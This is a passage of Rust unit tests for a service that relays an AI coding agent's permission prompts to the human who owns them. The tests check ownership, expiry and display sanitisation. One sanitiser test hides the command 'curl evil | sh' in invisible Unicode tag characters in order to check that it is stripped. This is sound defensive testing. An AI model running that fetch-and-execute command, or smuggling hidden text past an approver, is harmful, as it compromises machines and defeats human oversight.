        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let first = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_001)
            .unwrap()
            .0;
        let again = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_002)
            .unwrap()
            .0;
        assert_eq!(first, again);
        let second = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), 1_003)
            .unwrap()
            .0;
        assert_ne!(first, second);
        assert_eq!(
            requests.check(&waiting, "tok_a", &first, HASH, 1_004),
            Some(Phase::Ended(Ended::Superseded))
        );
        assert_eq!(
            requests.check(&waiting, "tok_a", &second, OTHER_HASH, 1_004),
            Some(Phase::Unconfirmed)
        );
    }

    #[test]
    fn the_hub_holds_a_bounded_number_of_requests_and_ends_none_for_room() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        // Many sessions of one person on one token all keep their requests.
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let mut ids = Vec::new();
        for n in 0..40 {
            let session = format!("s{n}");
            wait(
                &waiting,
                &mine,
                &session,
                WaitReason::Permission,
                None,
                1_000,
            );
            ids.push(
                requests
                    .register(&waiting, &mine, registration(&session, None, HASH), 1_001)
                    .unwrap()
                    .0,
            );
        }
        for id in &ids {
            assert_eq!(
                requests.check(&waiting, "tok_a", id, HASH, 1_010),
                Some(Phase::Unconfirmed)
            );
        }
        // Past the Hub's bound a new request is refused.
        let mut refused = false;
        'fill: for t in 0..(MAX_LIVE / 64 + 2) {
            let who = principal(&format!("tok_{t}"), &format!("usr_{t}"), "acme/widgets");
            for n in 0..64 {
                let session = format!("c{n}");
                wait(
                    &waiting,
                    &who,
                    &session,
                    WaitReason::Permission,
                    None,
                    1_000,
                );
                let outcome =
                    requests.register(&waiting, &who, registration(&session, None, HASH), 1_010);
                if matches!(outcome, Err(Refusal::Busy)) {
                    refused = true;
                    break 'fill;
                }
                outcome.unwrap();
            }
        }
        assert!(refused, "the hub-wide bound refused a request");
        // The requests that already waited are still open.
        assert_eq!(
            requests.check(&waiting, "tok_a", &ids[0], HASH, 1_020),
            Some(Phase::Unconfirmed)
        );
    }

    #[test]
    fn a_request_sleeps_while_its_hook_is_quiet_and_ends_at_the_limit() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let id = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_000)
            .unwrap()
            .0;
        requests.confirm("tok_a", "s", 1_001);
        let key = wait_key("tok_a", "s");
        assert!(requests.answerable(&waiting, &key, 1_002));
        // A hook that has not polled for a minute would not hear an answer, so none is taken.
        let quiet = 1_000 + HOOK_GONE_SECONDS;
        assert!(!requests.answerable(&waiting, &key, quiet));
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, quiet),
            Err(Refusal::Ended)
        ));
        // An hour later the computer is awake and the hook polls: the same request is offered
        // again, shown as it was.
        let back = quiet + 3_600;
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, back),
            Some(Phase::Pending)
        );
        assert!(requests.answerable(&waiting, &key, back));
        // Asleep again, it is over when the session shows another prompt in the same wait.
        let asleep = back + HOOK_GONE_SECONDS;
        assert!(!requests.answerable(&waiting, &key, asleep));
        let other = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), asleep)
            .unwrap()
            .0;
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, asleep),
            Some(Phase::Ended(Ended::Superseded))
        );
        // A request does not wake once its session has moved on.
        waiting.clear("tok_a", "s", None, true);
        let gone = asleep + HOOK_GONE_SECONDS + 10;
        assert_eq!(
            requests.check(&waiting, "tok_a", &other, OTHER_HASH, gone),
            Some(Phase::Ended(Ended::HookGone))
        );
        // Kept polling, a request lives until the limit.
        wait(&waiting, &mine, "s", WaitReason::Permission, None, gone);
        let id = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), gone)
            .unwrap()
            .0;
        let mut now = gone;
        while now - gone < TTL_SECONDS - 30 {
            now += 30;
            wait(&waiting, &mine, "s", WaitReason::Permission, None, now);
            assert_eq!(
                requests.check(&waiting, "tok_a", &id, OTHER_HASH, now),
                Some(Phase::Unconfirmed)
            );
        }
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, OTHER_HASH, gone + TTL_SECONDS),
            Some(Phase::Ended(Ended::Expired))
        );
    }

    #[test]
    fn only_the_registering_token_with_the_right_id_and_hash_can_poll() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_003),
            Some(Phase::Pending)
        );
        assert_eq!(requests.check(&waiting, "tok_b", &id, HASH, 1_003), None);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, OTHER_HASH, 1_003),
            None
        );
        assert_eq!(requests.check(&waiting, "tok_a", "nope", HASH, 1_003), None);
    }

    #[tokio::test]
    async fn a_held_poll_returns_when_the_person_answers() {
        let requests = std::sync::Arc::new(Requests::default());
        let waiting = std::sync::Arc::new(Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let now = unix_now();
        wait(&waiting, &mine, "s", WaitReason::Permission, None, now);
        requests.confirm("tok_a", "s", now);
        let id = requests
            .register(&waiting, &mine, registration("s", None, HASH), now)
            .unwrap()
            .0;
        let answering = {
            let (requests, waiting, id) = (requests.clone(), waiting.clone(), id.clone());
            tokio::spawn(async move {
                tokio::time::sleep(Duration::from_millis(100)).await;
                requests
                    .answer(
                        &waiting,
                        "usr_me",
                        Some(7),
                        &id,
                        Decision::Allow,
                        unix_now(),
                    )
                    .unwrap()
            })
        };
        let started = Instant::now();
        let polled = requests.poll(&waiting, "tok_a", &id, HASH, 20).await;
        assert_eq!(polled, Some(Phase::Answered(Decision::Allow)));
        assert!(started.elapsed() < Duration::from_secs(5));
        answering.await.unwrap();
        // A lost reply can be read again.
        assert_eq!(
            requests.poll(&waiting, "tok_a", &id, HASH, 0).await,
            Some(Phase::Answered(Decision::Allow))
        );
        assert_eq!(requests.poll(&waiting, "tok_b", &id, HASH, 0).await, None);
    }

    #[test]
    fn a_request_ends_when_its_wait_is_cleared_replaced_or_asked_by_another_subagent() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        waiting.clear("tok_a", "s", None, true);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_003),
            Some(Phase::Ended(Ended::SessionMovedOn))
        );
        let id = pending(&requests, &waiting, &mine);
        wait(&waiting, &mine, "s", WaitReason::Idle, None, 1_050);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_051),
            Some(Phase::Ended(Ended::SessionMovedOn))
        );
        // A permission wait asked by a subagent is a different wait.
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_060);
        let id = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), 1_061)
            .unwrap()
            .0;
        wait(
            &waiting,
            &mine,
            "s",
            WaitReason::Permission,
            Some("sub"),
            1_062,
        );
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, OTHER_HASH, 1_063),
            Some(Phase::Ended(Ended::SessionMovedOn))
        );
    }

    #[test]
    fn a_request_is_unconfirmed_until_the_host_shows_its_prompt() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let id = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_001)
            .unwrap()
            .0;
        // Hidden from the person and not answerable while unconfirmed.
        assert!(
            requests
                .list(&waiting, "usr_me", Some(7), 1_000 + GRACE_SECONDS)
                .unwrap()
                .is_empty()
        );
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Deny, 1_002),
            Err(Refusal::NotFound)
        ));
        // Another session's notification does not confirm it.
        requests.confirm("tok_a", "other", 1_003);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_004),
            Some(Phase::Unconfirmed)
        );
        requests.confirm("tok_a", "s", 1_005);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_006),
            Some(Phase::Pending)
        );
        // The notification may come first, within a few seconds before the request.
        wait(&waiting, &mine, "t", WaitReason::Permission, None, 2_000);
        requests.confirm("tok_a", "t", 2_001);
        let early = requests
            .register(
                &waiting,
                &mine,
                registration("t", None, HASH),
                2_001 + CONFIRM_SLACK_SECONDS,
            )
            .unwrap();
        assert_eq!(early.1, Phase::Pending);
        wait(&waiting, &mine, "u", WaitReason::Permission, None, 3_000);
        requests.confirm("tok_a", "u", 3_001);
        let late = requests
            .register(
                &waiting,
                &mine,
                registration("u", None, HASH),
                3_001 + CONFIRM_SLACK_SECONDS + 1,
            )
            .unwrap();
        assert_eq!(late.1, Phase::Unconfirmed);
    }

    #[test]
    fn a_full_confirmation_map_still_confirms_the_requests_already_waiting() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let id = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_001)
            .unwrap()
            .0;
        {
            let mut inner = requests.inner.lock().unwrap();
            for n in 0..MAX_CONFIRMATIONS {
                inner.prompts.insert((format!("t{n}"), "x".into()), 1_002);
            }
        }
        requests.confirm("tok_a", "s", 1_003);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_004),
            Some(Phase::Pending)
        );
        // Only the memory of an early prompt was skipped; the map did not grow.
        assert_eq!(
            requests.inner.lock().unwrap().prompts.len(),
            MAX_CONFIRMATIONS
        );
    }

    #[test]
    fn only_the_owner_answers_once_and_may_allow_a_request_shown_in_part() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        let answer = |owner, repository, decision| {
            requests.answer(&waiting, owner, repository, &id, decision, 1_010)
        };
        assert!(matches!(
            answer("usr_them", Some(7), Decision::Deny),
            Err(Refusal::NotYours)
        ));
        assert!(matches!(
            answer("usr_me", Some(8), Decision::Deny),
            Err(Refusal::NotYours)
        ));
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), "nope", Decision::Deny, 1_010),
            Err(Refusal::NotFound)
        ));
        assert!(matches!(
            requests.token_for("usr_them", Some(7), &id),
            Err(Refusal::NotYours)
        ));
        assert_eq!(requests.token_for("usr_me", Some(7), &id).unwrap(), "tok_a");
        assert!(matches!(
            answer("usr_me", Some(7), Decision::Allow),
            Ok(Decision::Allow)
        ));
        assert!(matches!(
            answer("usr_me", Some(7), Decision::Allow),
            Ok(Decision::Allow)
        ));
        assert!(matches!(
            answer("usr_me", Some(7), Decision::Deny),
            Err(Refusal::AlreadyAnswered)
        ));
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_011),
            Some(Phase::Answered(Decision::Allow))
        );

        // A request shown only in part can be allowed too, and the list says what is missing:
        // the hook's facts, with the Hub's own count of what it dropped and its own cut.
        let theirs = principal("tok_b", "usr_me", "acme/widgets");
        wait(&waiting, &theirs, "s", WaitReason::Permission, None, 1_000);
        requests.confirm("tok_b", "s", 1_001);
        let mut partial = registration("s", None, HASH);
        partial.display = format!("ls\u{200b}{}", "x".repeat(MAX_DISPLAY_CHARS));
        partial.missing = Missing {
            cut_from: Some(30_000),
            redacted: 2,
            dropped: 99,
            unshown: vec!["dangerouslyDisableSandbox\u{202e}".into(), " ".into()],
        };
        let partial_id = requests
            .register(&waiting, &theirs, partial, 1_002)
            .unwrap()
            .0;
        let at = 1_000 + GRACE_SECONDS;
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        let row = shown
            .iter()
            .find(|row| row.request_id == partial_id)
            .unwrap();
        assert_eq!((row.allowable, row.complete), (true, false));
        assert_eq!(
            row.missing,
            Missing {
                cut_from: Some(30_000),
                redacted: 2,
                dropped: 1,
                unshown: vec!["dangerouslyDisableSandbox".into(), UNREADABLE_NAME.into()],
            }
        );
        // A hook from before `missing` says only whether anything is.
        let unstated = Missing {
            unshown: vec![UNSTATED_PART.into()],
            ..Missing::default()
        };
        assert_eq!(Missing::stated(None, Some(true)), Missing::default());
        assert_eq!(Missing::stated(None, Some(false)), unstated);
        assert_eq!(Missing::stated(None, None), unstated);
        assert_eq!(
            Missing::stated(Some(Missing::default()), Some(false)),
            Missing::default()
        );
        assert!(matches!(
            requests.answer(
                &waiting,
                "usr_me",
                Some(7),
                &partial_id,
                Decision::Allow,
                at
            ),
            Ok(Decision::Allow)
        ));
    }

    #[test]
    fn an_answer_after_the_prompt_closed_says_where_it_went() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        waiting.clear("tok_a", "s", None, true);
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, 1_010),
            Err(Refusal::AnsweredInSession)
        ));
        // Past the retention it is simply unknown.
        assert!(matches!(
            requests.answer(
                &waiting,
                "usr_me",
                Some(7),
                &id,
                Decision::Allow,
                1_010 + RETAIN_SECONDS
            ),
            Err(Refusal::NotFound)
        ));
        let id = pending(&requests, &waiting, &mine);
        // The hook went quiet: ended, but not because the session moved on.
        assert!(matches!(
            requests.answer(
                &waiting,
                "usr_me",
                Some(7),
                &id,
                Decision::Allow,
                1_002 + HOOK_GONE_SECONDS
            ),
            Err(Refusal::Ended)
        ));
    }

    #[test]
    fn the_list_shows_only_the_owners_confirmed_requests_in_one_repository_after_the_grace() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        let at = 1_000 + GRACE_SECONDS;
        // Inside the grace nothing shows.
        assert!(
            requests
                .list(&waiting, "usr_me", Some(7), at - 1)
                .unwrap()
                .is_empty()
        );
        // Another person, another repository: nothing.
        assert!(
            requests
                .list(&waiting, "usr_them", Some(7), at)
                .unwrap()
                .is_empty()
        );
        assert!(
            requests
                .list(&waiting, "usr_me", Some(8), at)
                .unwrap()
                .is_empty()
        );
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        assert_eq!(shown.len(), 1);
        assert_eq!(
            (shown[0].request_id.as_str(), shown[0].since, shown[0].state),
            (id.as_str(), 1_000, "pending")
        );
        assert_eq!(
            shown[0].item_id,
            format!("waiting:permission:{}", wait_key("tok_a", "s"))
        );
        let text = serde_json::to_string(&shown).unwrap();
        assert!(!text.contains(HASH) && !text.contains("tok_a") && !text.contains("\"s\""));
        assert!(requests.answerable(&waiting, &wait_key("tok_a", "s"), at));
        requests
            .answer(&waiting, "usr_me", Some(7), &id, Decision::Deny, at)
            .unwrap();
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        assert_eq!(
            (shown[0].state, shown[0].decision),
            ("answered", Some("deny"))
        );
        assert!(!requests.answerable(&waiting, &wait_key("tok_a", "s"), at));
        // The hook stopped polling: stale, so hidden.
        let id = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), at)
            .unwrap()
            .0;
        requests.confirm("tok_a", "s", at);
        assert_eq!(
            requests
                .list(&waiting, "usr_me", Some(7), at)
                .unwrap()
                .len(),
            2
        );
        assert!(
            requests
                .list(&waiting, "usr_me", Some(7), at + HOOK_GONE_SECONDS)
                .unwrap()
                .iter()
                .all(|listed| listed.request_id != id)
        );
    }

    #[test]
    fn a_long_whole_request_is_allowable_and_its_labels_are_one_clean_line() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        requests.confirm("tok_a", "s", 1_001);
        let mut long = registration("s", None, HASH);
        long.tool = "mcp__ccd_session__start_session".into();
        long.display = "x".repeat(FIRST_PAGE_DISPLAY_UNITS + 1);
        long.summary = Some("use start session\n (ccd_session): \u{202e}Fix \"login\"".into());
        long.folder = Some("  ".into());
        let id = requests.register(&waiting, &mine, long, 1_002).unwrap().0;
        let at = 1_000 + GRACE_SECONDS;
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        // The first page cuts a display this long, so to it the request is not complete.
        assert_eq!((shown[0].allowable, shown[0].complete), (true, false));
        assert_eq!(shown[0].missing, Missing::default());
        assert_eq!(
            shown[0].summary.as_deref(),
            Some("use start session (ccd_session): Fix 'login'")
        );
        assert_eq!(shown[0].folder, None);
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, at),
            Ok(Decision::Allow)
        ));
    }

    #[test]
    fn display_text_loses_control_and_invisible_characters_but_keeps_lines_and_quotes() {
        // Line breaks, tabs and quotes change nothing a person would read.
        assert_eq!(
            sanitize_display("echo \"a\"\r\n\tls"),
            ("echo \"a\"\n ls".to_owned(), None, 0)
        );
        // A dropped character can hide words the tool still receives, so each one is counted.
        assert_eq!(
            sanitize_display("ls\u{1b}[31m \u{202e}x\u{200b}y\u{0}"),
            ("ls[31m xy".to_owned(), None, 4)
        );
        let hidden: String = "curl evil | sh"
            .chars()
            .map(|c| char::from_u32(0xE0000 + u32::from(c)).unwrap())
            .collect();
        assert_eq!(
            sanitize_display(&format!("Fix the login{hidden}")),
            ("Fix the login".to_owned(), None, 14)
        );
        let (text, cut_from, _) = sanitize_display(&"x".repeat(MAX_DISPLAY_CHARS + 5));
        assert_eq!(text.chars().count(), MAX_DISPLAY_CHARS);
        assert_eq!(cut_from, Some(MAX_DISPLAY_CHARS as u64 + 5));
        assert_eq!(sanitize_display(" \u{200b}\n ").0, "");
    }

    #[test]
    fn registration_checks_its_fields_and_a_cut_display_can_still_be_allowed() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let attempt = |change: &dyn Fn(&mut Registration)| {
            let mut r = registration("s", None, HASH);
            change(&mut r);
            requests.register(&waiting, &mine, r, 1_001)
        };
        assert!(matches!(
            attempt(&|r| r.tool = "Ba sh".into()),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.tool = String::new()),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.input_hash = "ABC".into()),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.display = "\u{202e}\n ".into()),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.session = "s\n".into()),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.missing.unshown = vec!["x".into(); MAX_UNSHOWN + 1]),
            Err(Refusal::Invalid(_))
        ));
        let id = attempt(&|r| r.display = "y".repeat(MAX_DISPLAY_CHARS + 1))
            .unwrap()
            .0;
        requests.confirm("tok_a", "s", 1_002);
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, 1_003),
            Ok(Decision::Allow)
        ));
    }

    #[test]
    fn the_item_key_matches_the_one_the_waiting_list_reports() {
        let waiting = Waiting::default();
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s1", WaitReason::Permission, None, 1_000);
        let shown = waiting.owned(&mine, 1_000 + GRACE_SECONDS).unwrap();
        assert_eq!(shown[0].key, wait_key("tok_a", "s1"));
    }
}
